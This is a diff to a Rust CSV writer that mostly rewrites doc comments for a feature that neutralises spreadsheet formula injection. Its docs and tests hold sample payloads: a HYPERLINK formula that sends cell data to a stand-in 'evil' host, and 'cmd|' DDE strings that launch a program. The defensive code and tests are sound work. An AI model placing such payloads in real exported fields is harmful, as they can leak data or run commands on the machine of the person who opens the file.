@@ -1,4 +1,4 @@
-//! Minimal CSV writer — RFC 4180 compliant, zero deps.
+//! Small CSV writer. Follows RFC 4180 and pulls in no dependencies.
 //!
 //! ## Quick start
 //!
@@ -14,20 +14,17 @@
 //!
 //! ## Quoting rules (RFC 4180)
 //!
-//! - Wrap a field in `"..."` if it contains `,`, `"`, `\r`, or `\n`
-//! - Inside a quoted field, `"` is doubled (`""`)
-//! - Plain ASCII without special chars goes unquoted
+//! A field is wrapped in `"..."` when it holds `,`, `"`, `\r` or `\n`.
+//! Inside quotes, `"` is written twice. Anything else goes out as is.
 //!
-//! ## Common use cases
-//!
-//! - Admin "Export to CSV" buttons (large querysets)
-//! - Logs / audit trail dumps
-//! - Bulk data download endpoints
+//! By default every cell also passes through
+//! [`neutralize_formula`](crate::csv::neutralize_formula), so
+//! an export a person opens in a spreadsheet cannot run code.
 
-/// Build a [`CsvWriter`] from a slice of [`serde_json::Value`] rows
-/// + a list of column names. Each row is expected to be an object;
-/// missing keys render as empty cells. Useful for piping a list
-/// endpoint's JSON output into a CSV download with no extra glue.
+/// Build a [`CsvWriter`] from JSON rows and a list of column names.
+///
+/// Each row should be an object. A missing key becomes an empty cell.
+/// Handy for turning a list endpoint's JSON into a CSV download.
 ///
 /// ```
 /// use rustango::csv::csv_from_json_rows;
@@ -55,10 +52,9 @@ pub fn csv_from_json_rows(columns: &[&str], rows: &[serde_json::Value]) -> CsvWr
     w
 }
 
-/// Render a single JSON value into a flat CSV cell. Strings unwrap;
-/// numbers / bools stringify; null + missing fields become empty;
-/// objects + arrays serialize back to JSON so the cell carries
-/// readable structure rather than `[object Object]`.
+/// Render one JSON value as a flat cell. Strings unwrap, numbers and
+/// bools stringify, null and missing keys become empty. Objects and
+/// arrays keep their JSON text so the cell stays readable.
 fn json_cell_to_string(v: Option<&serde_json::Value>) -> String {
     match v {
         None | Some(serde_json::Value::Null) => String::new(),
@@ -69,16 +65,16 @@ fn json_cell_to_string(v: Option<&serde_json::Value>) -> String {
     }
 }
 
-/// CSV writer that builds output into an in-memory `String`.
+/// CSV writer that builds the output in memory.
 ///
-/// For very large exports, write rows in batches and flush — but the typical
-/// admin-export-button pattern fits comfortably in memory.
+/// A typical admin export fits in memory. For very large ones, write in
+/// batches and flush each batch yourself.
 #[derive(Default)]
 pub struct CsvWriter {
     out: String,
     column_count: Option<usize>,
-    /// When `true` (the default) a value that would be read as a
-    /// spreadsheet formula is neutralised. See [`Self::raw_formulas`].
+    /// Off by default, so formulas are neutralised. Set by
+    /// [`Self::raw_formulas`].
     allow_formulas: bool,
 }
 
@@ -89,8 +85,8 @@ impl CsvWriter {
         Self::default()
     }
 
-    /// Write the header row. Pins the column count — subsequent `row()`
-    /// calls must match (extra fields truncated, short rows padded).
+    /// Write the header row. This fixes the column count: later rows are
+    /// padded or truncated to match.
     pub fn headers<I, S>(&mut self, headers: I)
     where
         I: IntoIterator<Item = S>,
@@ -101,8 +97,8 @@ impl CsvWriter {
         self.write_row(&headers);
     }
 
-    /// Write a data row. If `headers()` was called, the row is padded
-    /// (with empty strings) or truncated to match the column count.
+    /// Write a data row. After `headers()`, the row is padded with empty
+    /// strings or cut down to the column count.
     pub fn row<I, S>(&mut self, row: I)
     where
         I: IntoIterator<Item = S>,
@@ -115,23 +111,23 @@ impl CsvWriter {
         self.write_row(&row);
     }
 
-    /// Take the buffered CSV output, consuming the writer.
+    /// Take the buffered output.
     #[must_use]
     pub fn into_string(self) -> String {
         self.out
     }
 
-    /// View the current buffered CSV output without consuming the writer.
+    /// Look at the buffered output so far.
     #[must_use]
     pub fn as_str(&self) -> &str {
         &self.out
     }
 
-    /// Opt out of formula neutralisation and emit values byte-for-byte.
+    /// Write values byte for byte, skipping formula neutralisation.
     ///
-    /// Only for CSV consumed by a machine. Anything a person may open in
-    /// Excel / LibreOffice / Sheets should keep the default — see
-    /// [`neutralize_formula`] for what it guards against.
+    /// Use this only for CSV read by a machine. If a person may open the
+    /// file in Excel, LibreOffice or Sheets, keep the default: see
+    /// [`neutralize_formula`].
     #[must_use]
     pub fn raw_formulas(mut self) -> Self {
         self.allow_formulas = true;
@@ -154,25 +150,20 @@ impl CsvWriter {
     }
 }
 
-/// Defuse a cell that a spreadsheet would evaluate as a formula
-/// (CWE-1236, #1283).
+/// Defuse a cell that a spreadsheet would run as a formula (CWE-1236).
 ///
-/// Excel, LibreOffice and Google Sheets treat a leading `=`, `+`, `-`,
-/// `@` — and a leading tab or CR — as the start of a formula, so an
-/// exported value like
+/// Excel, LibreOffice and Sheets start a formula on a leading `=`, `+`,
+/// `-`, `@`, tab or CR, so an exported value like
 ///
 /// ```text
 /// =HYPERLINK("https://evil.example/?d="&A1,"Click for details")
 /// ```
 ///
-/// runs on open. RFC 4180 quoting does not help: the quotes are stripped
-/// before the cell is parsed. The fix is to prefix the value with a
-/// single quote, which spreadsheets consume as "this is literal text".
+/// runs when the file is opened. RFC 4180 quoting does not stop it: the
+/// quotes are removed before the cell is parsed. Prefixing the value
+/// with a single quote does, because that marks it as literal text.
 ///
-/// **Numbers are left alone.** A blanket prefix would mangle every
-/// negative number in an export (`-5` → `'-5`), so a field that parses
-/// as a plain number passes through untouched — `-5` and `+3.14` are
-/// data, `-2+cmd|'/c calc'!A0` is not.
+/// Plain numbers pass through, so `-5` and `+3.14` stay usable data.
 #[must_use]
 pub fn neutralize_formula(s: &str) -> String {
     let Some(first) = s.chars().next() else {
@@ -281,11 +272,11 @@ mod tests {
         assert_eq!(w.into_string(), "a,b\r\n1,2\r\n");
     }
 
-    // ---- #1283 formula injection ----
+    // ---- formula injection ----
 
     #[test]
     fn leading_formula_triggers_are_neutralised() {
-        // The classic: an exfiltrating hyperlink in a user-set field.
+        // A hyperlink that leaks data, set through a user field.
         assert_eq!(
             neutralize_formula(r#"=HYPERLINK("http://evil/?"&A1,"x")"#),
             r#"'=HYPERLINK("http://evil/?"&A1,"x")"#
@@ -303,8 +294,7 @@ mod tests {
 
     #[test]
     fn numbers_are_not_mangled() {
-        // A blanket prefix would wreck every negative number in an
-        // export. These are data, not formulas.
+        // These are data, not formulas.
         for n in ["-5", "-5.25", "+3.14", "0", "1e6", "-1e-6"] {
             assert_eq!(neutralize_formula(n), n, "{n} must pass through");
         }
@@ -325,8 +315,7 @@ mod tests {
         // Prefixed, and the leading quote does not itself force quoting.
         assert_eq!(w.as_str(), "name\r\n'=1+1\r\n");
 
-        // A formula containing a comma still gets RFC 4180 quoting on
-        // top of the prefix.
+        // A formula with a comma gets RFC 4180 quoting as well.
         let mut w = CsvWriter::new();
         w.row(["=A1,B1"]);
         assert_eq!(w.as_str(), "\"'=A1,B1\"\r\n");
@@ -341,8 +330,7 @@ mod tests {
 
     #[test]
     fn json_export_helper_is_protected_by_default() {
-        // The shape csv_response.rs documents: user-controlled fields
-        // dumped for an operator to open.
+        // User-controlled fields dumped for an operator to open.
         let rows = vec![serde_json::json!({ "name": "=cmd|' /c calc'!A0" })];
         let out = csv_from_json_rows(&["name"], &rows).into_string();
         assert!(
